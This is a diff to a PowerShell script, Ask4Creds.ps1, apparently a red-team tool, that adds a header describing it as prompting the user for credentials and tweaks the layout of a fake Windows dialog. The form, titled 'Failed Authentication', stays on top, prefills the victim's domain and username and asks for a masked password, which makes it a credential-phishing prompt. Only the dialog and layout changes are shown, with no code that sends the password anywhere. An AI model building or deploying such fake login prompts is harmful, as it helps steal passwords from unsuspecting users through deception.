@@ -1,3 +1,14 @@
+<#
+
+.SYNOPSIS
+Ask4Creds.ps1 Author: Rob LP (@L3o4j)
+https://github.com/Leo4j
+
+.DESCRIPTION
+Prompt User for credentials
+
+#>
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -10,6 +21,8 @@ $form.Text = 'Failed Authentication'
 $form.Size = New-Object System.Drawing.Size(350, 280)  # Increased the height from 250 to 280
 $form.StartPosition = 'CenterScreen'
 $form.TopMost = $true
+
+$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
 
 $form.ShowIcon = $false
 
@@ -44,7 +57,7 @@ $form.Controls.Add($userLabel)
 # Username Textbox
 $userBox = New-Object System.Windows.Forms.TextBox
 $userBox.Location = New-Object System.Drawing.Point(10, 110)
-$userBox.Size = New-Object System.Drawing.Size(330,20)
+$userBox.Size = New-Object System.Drawing.Size(310,20)
 $userBox.Text = [Environment]::UserDomainName + '\' + [Environment]::UserName
 $form.Controls.Add($userBox)
 
@@ -58,7 +71,7 @@ $form.Controls.Add($passwordLabel)
 # Password Textbox
 $passwordBox = New-Object System.Windows.Forms.TextBox
 $passwordBox.Location = New-Object System.Drawing.Point(10, 160)
-$passwordBox.Size = New-Object System.Drawing.Size(330,20)
+$passwordBox.Size = New-Object System.Drawing.Size(310,20)
 $passwordBox.UseSystemPasswordChar = $true
 $form.Controls.Add($passwordBox)
 
